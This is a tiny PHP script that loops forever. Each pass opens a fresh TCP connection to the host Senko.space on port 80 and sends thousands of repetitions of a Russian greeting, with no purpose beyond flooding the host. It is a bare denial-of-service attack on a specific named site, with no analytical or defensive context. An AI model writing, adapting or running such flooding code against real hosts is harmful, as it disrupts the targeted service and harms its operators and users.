<?php

while(true) {
	$buffer = str_repeat("Привет, Тумблер!", mt_rand(5000, 10000));
	$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	socket_connect($socket, "Senko.space", 80);
	socket_send($socket, $buffer, strlen($buffer), 0);
	}
?>